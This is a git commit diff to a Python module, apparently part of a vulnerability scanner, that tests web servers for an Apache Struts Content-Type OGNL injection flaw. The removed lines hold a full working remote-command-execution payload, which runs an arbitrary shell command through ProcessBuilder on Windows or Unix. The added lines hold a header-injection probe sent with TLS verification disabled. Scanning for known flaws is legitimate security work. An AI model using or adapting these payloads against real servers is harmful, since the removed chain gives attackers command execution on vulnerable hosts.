0ea33304ce1e2d54c00a1204e0e7e2ace5113d8c
Ahmed Ezzat <ahmed.ezzat119@outlook.com>
2019-04-12 19:25:09 +0200

    Update struts.py

--- lib/modules/struts.py
+++ lib/modules/struts.py
@@ -1,36 +1,18 @@
 # -*- coding: utf-8 -*-
 from colorama import Fore
-import urllib2
-import httplib
+import requests
 
-cmd = 'echo PWNED'
 
-def chkstruts(url):
-    ognl_payload = "%{(#_='multipart/form-data')."
-    ognl_payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
-    ognl_payload += "(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
-    ognl_payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
-    ognl_payload += "(#ognlUtil.getExcludedPackageNames().clear())."
-    ognl_payload += "(#ognlUtil.getExcludedClasses().clear())."
-    ognl_payload += "(#context.setMemberAccess(#dm))))."
-    ognl_payload += "(#cmd='{}').".format(cmd)
-    ognl_payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
-    ognl_payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
-    ognl_payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
-    ognl_payload += "(#p.redirectErrorStream(true))."
-    ognl_payload += "(#process=#p.start())."
-    ognl_payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
-    ognl_payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
-    ognl_payload += "(#ros.flush())"
+def chkstruts(url,timeout=30):
+    ognl_payload = ".multipart/form-data~${"
+    ognl_payload += '#context["com.opensymphony.xwork2.dispatcher.HttpServletResponse"].addHeader("PWNED",1330+7)'
     ognl_payload += "}"
     headers = {'Content-Type': ognl_payload}
     try:
-        request = urllib2.Request(url, headers=headers)
-        response = urllib2.urlopen(request).read()
-    except httplib.IncompleteRead, e:
-        response = e.partial
-
-    if 'PWNED' in response:
-        return "%sVulnerable" % (Fore.RED)
-    else:
-        return "%sSafe" % (Fore.GREEN)
+        response = requests.get(url,headers=headers,timeout=timeout,verify=False)
+        if "PWNED" in response.headers:
+            return "%sVulnerable" % (Fore.RED)
+        else:
+            return "%sSafe" % (Fore.GREEN)
+    except Exception as e:
+        return "%sUnreachable" % (Fore.RED)
